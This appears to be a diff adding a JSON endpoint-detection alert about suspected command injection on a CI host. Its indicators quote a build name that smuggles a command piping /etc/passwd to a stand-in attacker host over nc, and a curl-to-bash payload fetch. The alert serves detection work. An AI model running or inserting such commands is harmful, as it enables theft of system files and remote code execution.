@@ -1,0 +1,12 @@
+{
+  "alert_id": "EDR-2026-0177",
+  "severity": "high",
+  "host": "build-03",
+  "process": "ci-runner.sh",
+  "indicators": [
+    "user-supplied build name: 'release; cat /etc/passwd | nc evil.example.com 4444 #'",
+    "shell exec args contain: $(curl http://attacker/payload.sh | bash)",
+    "outbound TCP to 203.0.113.42:4444 from non-canonical port"
+  ],
+  "summary": "Suspected command injection in CI build name parameter"
+}
